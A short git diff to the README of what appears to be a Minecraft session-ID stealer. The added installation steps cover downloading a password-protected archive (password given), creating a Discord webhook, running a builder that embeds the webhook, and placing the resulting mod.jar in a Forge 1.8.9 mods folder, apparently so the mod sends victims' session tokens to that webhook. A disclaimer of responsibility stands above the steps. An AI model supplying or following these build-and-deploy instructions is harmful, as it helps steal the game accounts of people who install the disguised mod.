@@ -9,4 +9,10 @@ I, the creator am not responsible for anything you do with this software. This i
 # Installation 
 
 * First Download SSID.zip
-* Extract The file using winrar[https://www.rarlab.com/download.htm] 
+* Extract The file using [winrar](https://www.rarlab.com/download.htm)
+* The password for the file is 7777
+* Make a new discord webhook [How ?](https://www.youtube.com/watch?v=fKksxz2Gdnc)
+* Run the ssid and put ur webhook and click Build 
+* You file ready put ur mod.jar in ur mod folder and now it's working ( need forge 1.8.9 to work)
+
+
